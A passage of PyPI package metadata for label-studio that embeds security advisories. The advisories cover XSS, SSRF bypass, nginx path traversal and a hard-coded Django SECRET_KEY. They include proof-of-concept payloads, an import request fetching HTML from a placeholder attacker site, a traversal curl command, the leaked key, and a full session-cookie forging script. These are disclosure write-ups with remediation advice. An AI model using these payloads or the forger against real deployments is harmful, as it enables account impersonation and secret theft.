complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"1.0.0.post3":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: MIT License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/1.0.0.post3/","requires_dist":["wheel","appdirs (>=1.4.3)","attr (==0.3.1)","attrs (>=19.1.0)","pyyaml (>=5.3.1)","azure-storage-blob (>=12.6.0)","boto (==2.49.0)","boto3 (==1.16.28)","botocore (==1.19.28)","google-cloud-storage (==1.28.1)","Django (==3.1.4)","django-annoying (==0.10.6)","django-debug-toolbar (==3.2)","django-filter (==2.4.0)","django-model-utils (==4.1.1)","django-rq (==2.3.2)","django-cors-headers (==3.6.0)","django-extensions (==3.1.0)","django-rest-swagger (==2.2.0)","django-user-agents (==0.4.0)","django-redis-cache (==3.0.0)","drf-dynamic-fields (==0.3.0)","drf-yasg (==1.20.0)","drf-generators (==0.3.0)","label-studio-converter (==0.0.26)","htmlmin (==0.1.12)","jsonschema (==3.2.0)","lockfile (==0.12.2)","lxml (>=4.2.5)","moto (==1.3.16.dev122)","numpy (>=1.19.1)","ordered-set (==4.0.2)","pandas (>=0.24.0)","protobuf (>=3.15.5)","psycopg2-binary (==2.8.4)","pydantic (==1.7.3)","python-dateutil (==2.8.1)","pytz (==2019.3)","requests (<3,>=2.22.0)","rq (==1.7.0)","rules (==2.2)","ujson (>=3.0.0)","xmljson (==0.2.0)","colorama (>=0.4.4)","boxing (>=0.1.4)","redis (>=3.5.0)"],"requires_python":">=3.6","summary":"Label Studio annotation tool","version":"1.0.0.post3","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"eac77a96e552965401d5a5705539c10eb80e75dd2a19b84342a5642e6ca7bd02","md5":"805456c424aecd9b337f689b2f7e6b4c","sha256":"5ccee25c9b92c6a1b23602fcaa93dddc7b6842da7c9ffaf59fbe4979135a57b5"},"downloads":-1,"filename":"label_studio-1.0.0.post3-py3-none-any.whl","has_sig":false,"md5_digest":"805456c424aecd9b337f689b2f7e6b4c","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.6","size":49471554,"upload_time":"2021-03-22T13:00:35","upload_time_iso_8601":"2021-03-22T13:00:35.794507Z","url":"https://files.pythonhosted.org/packages/ea/c7/7a96e552965401d5a5705539c10eb80e75dd2a19b84342a5642e6ca7bd02/label_studio-1.0.0.post3-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"aecce0b345321568c35e3c01198d04b90403bd160b3417e8b04fea20b0e92c76","md5":"2ea905743340980977d10238b6def285","sha256":"65acfecc4b9795b9204ffdff484cdad6ac93521cf2d59cef19295af248800612"},"downloads":-1,"filename":"label-studio-1.0.0.post3.tar.gz","has_sig":false,"md5_digest":"2ea905743340980977d10238b6def285","packagetype":"sdist","python_version":"source","requires_python":">=3.6","size":48641593,"upload_time":"2021-03-22T13:00:56","upload_time_iso_8601":"2021-03-22T13:00:56.733084Z","url":"https://files.pythonhosted.org/packages/ae/cc/e0b345321568c35e3c01198d04b90403bd160b3417e8b04fea20b0e92c76/label-studio-1.0.0.post3.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, 